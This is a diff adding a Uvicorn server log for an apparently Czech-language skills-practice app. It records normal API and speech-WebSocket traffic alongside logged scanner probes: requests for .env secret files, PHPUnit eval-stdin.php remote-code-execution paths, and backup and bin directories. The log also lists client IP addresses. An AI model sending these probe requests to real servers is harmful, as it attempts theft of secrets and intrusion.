@@ -1,0 +1,1944 @@
+nohup: ignoring input
+INFO:     Started server process [823002]
+INFO:     Waiting for application startup.
+INFO:     ASGI 'lifespan' protocol appears unsupported.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     51.159.225.129:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     51.159.225.129:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     51.159.225.129:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     51.159.225.129:0 - "GET /api/examples/?topics=%5B65%2C72%2C83%5D HTTP/1.0" 200 OK
+INFO:     51.159.225.129:0 - "OPTIONS /api/create-record/ HTTP/1.0" 200 OK
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('51.159.225.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('51.159.225.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('51.159.225.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+INFO:     51.159.225.129:0 - "GET /api/examples/?topics=%5B65%2C69%2C71%5D HTTP/1.0" 200 OK
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('51.159.225.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+Speech recognition stopped.
+INFO:     159.65.193.17:41102 - "GET / HTTP/1.1" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/skill/69/ HTTP/1.0" 200 OK
+With count False
+Skill ids [70]
+With count False
+Skill ids [71]
+With count False
+Skill ids [80]
+With count False
+Skill ids [81]
+With count False
+Skill ids [82]
+With count False
+Skill ids [87]
+With count False
+Skill ids [88]
+With count False
+Skill ids [94]
+With count False
+Skill ids [95]
+INFO:     178.196.8.124:0 - "GET /api/skills/69/tree/children?with_counts=false HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/skills/69/operations HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/examples/?topics=%5B69%2C70%5D HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/survey-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/survey-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     178.196.8.124:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "GET /api/examples/?topics=%5B65%2C69%2C71%5D HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('178.196.8.124', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('178.196.8.124', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('178.196.8.124', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+Speech recognition stopped.
+INFO:     178.196.8.124:0 - "POST /api/survey-answer/ HTTP/1.0" 200 OK
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('178.196.8.124', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     178.196.8.124:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+Speech recognition stopped.
+INFO:     178.196.8.124:0 - "POST /api/delete-record/ HTTP/1.0" 204 No Content
+INFO:     52.16.245.145:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     52.16.245.145:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     198.235.24.104:57706 - "GET / HTTP/1.1" 200 OK
+INFO:     18.237.213.18:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     18.237.213.18:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     54.213.229.10:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     54.213.229.10:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     205.210.31.15:65238 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.18:44912 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.18:53818 - "GET /bins/ HTTP/1.1" 200 OK
+INFO:     204.76.203.18:49446 - "GET /bin/ HTTP/1.1" 200 OK
+INFO:     204.76.203.18:36250 - "GET /backup/ HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     142.93.149.172:41760 - "GET / HTTP/1.1" 200 OK
+INFO:     142.93.149.172:41762 - "GET /login HTTP/1.1" 200 OK
+INFO:     3.131.215.38:59986 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:54532 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     185.177.72.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     66.132.153.123:58320 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.123:58462 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.123:36984 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.123:37002 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.123:37050 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.123:37056 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.123:37064 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     51.158.205.139:65457 - "GET / HTTP/1.1" 200 OK
+INFO:     51.158.205.139:65457 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     51.158.205.139:65457 - "GET /assets/index-DjVa0JuB.css HTTP/1.1" 200 OK
+INFO:     51.158.205.139:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     51.158.205.139:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     51.158.205.139:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     51.158.205.139:0 - "GET /api/examples/?topics=%5B65%2C72%2C83%5D HTTP/1.0" 200 OK
+INFO:     51.158.205.139:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.158.205.139:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     51.158.205.139:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     51.159.225.129:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.214:59648 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.92:59210 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.94:56939 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.197.98:47507 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     147.229.8.94:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     147.229.8.94:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/examples/?topics=%5B65%2C69%2C71%5D HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     147.229.8.94:0 - "GET /api/skill/66/ HTTP/1.0" 200 OK
+With count None
+Skill ids [66, 55, 55]
+With count None
+Skill ids [66, 61, 61]
+With count None
+Skill ids [66, 69, 69]
+With count None
+Skill ids [66, 69, 69, 71]
+With count None
+Skill ids [66, 69, 69, 80]
+With count None
+Skill ids [66, 69, 69, 81]
+With count None
+Skill ids [66, 69, 69, 82]
+With count None
+Skill ids [66, 69, 69, 87]
+With count None
+Skill ids [66, 69, 69, 88]
+With count None
+Skill ids [66, 69, 69, 94]
+With count None
+Skill ids [66, 69, 69, 95]
+With count None
+Skill ids [66, 72, 72]
+With count None
+Skill ids [66, 75, 75]
+INFO:     147.229.8.94:0 - "GET /api/skills/66/tree/related HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/examples/?topics=%5B66%2C72%5D HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     147.229.182.17:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     147.229.182.17:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     147.229.182.17:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     147.229.182.17:0 - "GET /api/examples/?topics=%5B65%2C72%2C83%5D HTTP/1.0" 200 OK
+INFO:     147.229.182.17:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     147.229.182.17:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     147.229.182.17:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/examples/?topics=%5B66%2C72%5D HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     147.229.8.94:0 - "POST /api/login/admin HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/skill-tree/ HTTP/1.0" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/tasks/ HTTP/1.0" 200 OK
+INFO:     165.154.125.106:17162 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     165.154.125.106:17296 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.125.106:17814 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.125.106:17972 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     165.154.125.106:18098 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     165.154.125.106:18208 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     147.229.8.94:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     20.14.90.84:51202 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.150:64704 - "GET / HTTP/1.1" 200 OK
+INFO:     150.255.88.218:27385 - "GET / HTTP/1.1" 200 OK
+INFO:     122.96.28.150:19657 - "GET / HTTP/1.1" 200 OK
+INFO:     125.82.242.226:39830 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     138.197.191.164:42056 - "GET /api/tags HTTP/1.1" 404 Not Found
+INFO:     83.43.122.179:59004 - "GET / HTTP/1.0" 200 OK
+INFO:     54.253.67.82:0 - "GET //api/.env HTTP/1.0" 200 OK
+INFO:     54.253.67.82:0 - "GET //api/.env.example HTTP/1.0" 200 OK
+INFO:     54.253.67.82:0 - "GET //api/v2/.env HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.247.137.76:44539 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.24:57563 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.18:41140 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.18:55306 - "GET /bins/ HTTP/1.1" 200 OK
+INFO:     204.76.203.18:41928 - "GET /bin/ HTTP/1.1" 200 OK
+INFO:     204.76.203.18:54644 - "GET /backup/ HTTP/1.1" 200 OK
+INFO:     207.154.255.103:41686 - "GET /api/tags HTTP/1.1" 404 Not Found
+INFO:     205.210.31.66:58230 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.24:35865 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.69:52383 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     64.227.117.173:54610 - "GET / HTTP/1.1" 200 OK
+INFO:     64.227.117.173:54622 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.100:64508 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     192.241.161.5:53358 - "GET / HTTP/1.1" 200 OK
+INFO:     192.241.161.5:53364 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.197.137:25440 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.149:37719 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.197.140:33563 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.131.215.38:54488 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:54480 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     128.199.164.57:57232 - "GET /static/app.ico HTTP/1.1" 200 OK
+INFO:     128.199.164.57:57240 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     178.128.214.94:46668 - "GET /static/app.ico HTTP/1.1" 200 OK
+INFO:     178.128.214.94:46672 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     103.203.57.20:49352 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.207:47450 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.207:47456 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.207:47468 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.207:42504 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.207:42512 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.207:42538 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     87.236.176.125:49483 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.183:60111 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.79.5.11:43176 - "GET / HTTP/1.1" 200 OK
+INFO:     45.79.172.21:29040 - "GET / HTTP/1.1" 200 OK
+INFO:     2.57.122.234:53528 - "GET /tools/start HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.195:57998 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     94.94.93.164:44968 - "GET / HTTP/1.0" 200 OK
+INFO:     165.154.163.10:39460 - "GET / HTTP/1.0" 200 OK
+INFO:     165.154.163.10:41528 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     165.154.163.10:44604 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     165.154.163.10:45794 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     165.154.163.10:49704 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     165.154.163.10:52346 - "GET /llms.txt HTTP/1.1" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/skill/75/ HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/skills/75/tree/children?with_counts=false HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/skills/75/operations HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/examples/?topics=%5B75%5D HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('87.244.221.32', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+Speech recognition stopped.
+INFO:     87.244.221.32:0 - "POST /api/skip-example/ HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('87.244.221.32', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+Speech recognition stopped.
+INFO:     87.244.221.32:0 - "GET /api/examples/?topics=%5B75%5D HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     162.142.125.125:51294 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.125:55084 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.125:58170 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.125:58184 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.125:58202 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.125:58208 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.125:35084 - "GET /wiki HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.208.9:39508 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44504 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44512 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44526 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44538 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44550 - "GET /config.json HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44558 - "GET /sse HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44568 - "GET /mcp HTTP/1.1" 200 OK
+INFO:     152.32.208.9:44584 - "GET /mcp-sse HTTP/1.1" 200 OK
+INFO:     118.193.38.134:35826 - "GET / HTTP/1.1" 200 OK
+INFO:     118.193.38.134:35950 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     118.193.38.134:36108 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     118.193.38.134:36286 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     118.193.38.134:36284 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     47.237.107.130:0 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+INFO:     47.237.107.130:0 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+INFO:     47.237.107.130:0 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     138.197.170.154:45666 - "GET / HTTP/1.1" 200 OK
+INFO:     138.197.170.154:45672 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
